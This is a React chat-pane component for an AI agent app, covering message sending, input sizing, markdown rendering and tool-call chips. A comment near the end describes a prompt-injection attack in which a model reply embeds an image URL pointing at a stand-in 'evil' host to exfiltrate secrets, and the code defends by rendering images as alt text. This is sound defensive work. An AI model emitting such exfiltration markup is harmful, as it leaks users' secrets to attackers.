'use client';

import { useChat } from '@ai-sdk/react';
import { DefaultChatTransport, type UIMessage } from 'ai';
import { useEffect, useLayoutEffect, useMemo, useRef, useState } from 'react';
import Markdown, { type Components } from 'react-markdown';
import type { StoredMessage } from '@/lib/api-types';

type Props = {
  sessionId: string;
  initialMessages: StoredMessage[];
  provider: string;
  model: string;
  onTurnEnd: () => void;
};

/** Chat pane. Remounted (via `key`) whenever the session changes. */
export function Chat({ sessionId, initialMessages, provider, model, onTurnEnd }: Props) {
  // Keep the latest model choice in a ref so the transport (created once) always sends it.
  const modelRef = useRef({ provider, model });
  modelRef.current = { provider, model };

  const compactedIds = useMemo(() => new Set(initialMessages.filter((m) => m.compacted).map((m) => m.id)), [initialMessages]);

  const transport = useMemo(
    () =>
      new DefaultChatTransport<UIMessage>({
        api: '/api/chat',
        // Only send the newest message; the server rebuilds history from SQLite.
        prepareSendMessagesRequest: ({ id, messages }) => ({
          body: { sessionId: id, message: messages[messages.length - 1], ...modelRef.current },
        }),
      }),
    [],
  );

  const { messages, sendMessage, status, error, stop } = useChat({
    id: sessionId,
    messages: initialMessages.map(({ id, role, parts }) => ({ id, role, parts })),
    transport,
    onFinish: onTurnEnd,
    onError: onTurnEnd,
  });

  const [input, setInput] = useState('');
  const textarea = useRef<HTMLTextAreaElement>(null);
  // Grow the box with its text (CSS max-height caps it, then it scrolls) and shrink it after sending.
  // Layout effect so the height is right before paint; block body because effects must return nothing.
  useLayoutEffect(() => {
    const el = textarea.current;
    if (!el) return;
    el.style.height = 'auto';
    el.style.height = `${el.scrollHeight + el.offsetHeight - el.clientHeight}px`;
  }, [input]);
  const bottom = useRef<HTMLDivElement>(null);
  // Block body on purpose: scrollIntoView returns a Promise in current Chrome, and an effect must
  // return nothing or a cleanup function ("destroy is not a function" otherwise).
  useEffect(() => {
    bottom.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const busy = status === 'submitted' || status === 'streaming';
  const submit = () => {
    if (!input.trim() || busy) return;
    void sendMessage({ text: input });
    setInput('');
  };

  return (
    <div className="chat">
      <div className="messages">
        {messages.length === 0 && <p className="muted chat-hint">Describe a goal, e.g. “Help me plan a 1-day team offsite.”</p>}
        {messages.map((m) => (
          <div key={m.id} className={`msg ${m.role} ${compactedIds.has(m.id) ? 'compacted' : ''}`}>
            <div className="role">
              {m.role}
              {compactedIds.has(m.id) && ' · compacted (model sees summary only)'}
            </div>
            {m.parts.map((p, i) => <Part key={i} part={p} markdown={m.role === 'assistant'} />)}
          </div>
        ))}
        {busy && <p className="muted working">Agent is working</p>}
        <div ref={bottom} />
      </div>
      {error && <div className="error">Error: {error.message}</div>}
      <div className="composer">
        <textarea
          ref={textarea}
          rows={1}
          value={input}
          placeholder="Message the agent (Enter to send, Shift+Enter for newline)"
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
              e.preventDefault();
              submit();
            }
          }}
        />
        {busy ? (
          <button onClick={() => void stop()}>Stop</button>
        ) : (
          <button className="btn-primary" onClick={submit} disabled={!input.trim()}>
            Send
          </button>
        )}
      </div>
    </div>
  );
}

/**
 * Markdown overrides for model output. A prompt-injected reply could embed `![](https://evil/?d=<secrets>)`,
 * which the browser would fetch with no click, so images are shown as their alt text instead (the CSP
 * img-src also blocks them). Links still work, but open in a new tab without sending a referrer.
 */
const MARKDOWN_COMPONENTS: Components = {
  img: ({ alt }) => <span className="muted">[image{alt ? `: ${alt}` : ''}]</span>,
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  ),
};

/**
 * Render one message part: assistant text as markdown (react-markdown ignores raw HTML and unsafe URL
 * schemes, so model output can't inject markup), user text as-is, tool calls as compact chips.
 */
function Part({ part, markdown }: { part: UIMessage['parts'][number]; markdown: boolean }) {
  if (part.type === 'text') {
    return markdown ? <div className="md"><Markdown components={MARKDOWN_COMPONENTS}>{part.text}</Markdown></div> : <div>{part.text}</div>;
  }
  if (part.type.startsWith('tool-') || part.type === 'dynamic-tool') {
    const t = part as { type: string; toolName?: string; state?: string; errorText?: string; output?: unknown };
    const name = t.toolName ?? t.type.replace(/^tool-/, '');
    const failed = Boolean(t.errorText) || (typeof t.output === 'object' && t.output !== null && 'error' in t.output);
    const icon = t.state === 'output-available' || t.state === 'output-error' ? (failed ? '✗' : '✓') : '…';
    return <span className={`chip ${failed ? 'err' : ''}`}>🔧 {name} {icon}</span>;
  }
  return null;
}
